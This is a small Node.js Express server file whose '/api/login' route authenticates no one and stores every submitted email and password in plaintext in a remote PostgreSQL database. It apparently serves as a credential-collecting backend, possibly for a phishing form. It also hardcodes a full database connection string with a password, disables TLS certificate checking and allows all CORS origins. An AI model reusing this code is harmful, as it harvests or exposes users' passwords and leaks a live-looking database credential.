// server.js
const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const { Pool } = require('pg');

const app = express();
const port = 5000;

// Middleware
app.use(cors());
app.use(bodyParser.json());

// PostgreSQL config
const pool = new Pool({
  connectionString: 'postgresql://neondb_owner:npg_jNW3ZYF2zibg@ep-tiny-sun-a41cfrf7-pooler.us-east-1.aws.neon.tech/neondb?sslmode=require',
  ssl: {
    rejectUnauthorized: false,
  },
});

// Route to handle form submission
app.post('/api/login', async (req, res) => {
  const { email, password } = req.body;
  try {
    await pool.query('CREATE TABLE IF NOT EXISTS users (id SERIAL PRIMARY KEY, email TEXT, password TEXT)');
    await pool.query('INSERT INTO users (email, password) VALUES ($1, $2)', [email, password]);
    res.status(200).json({ message: 'Login data stored successfully!' });
  } catch (error) {
    console.error('Error storing data:', error);
    res.status(500).json({ error: 'Failed to store data' });
  }
});

// Start server
app.listen(port, () => {
  console.log(`Server running on http://localhost:${port}`);
});
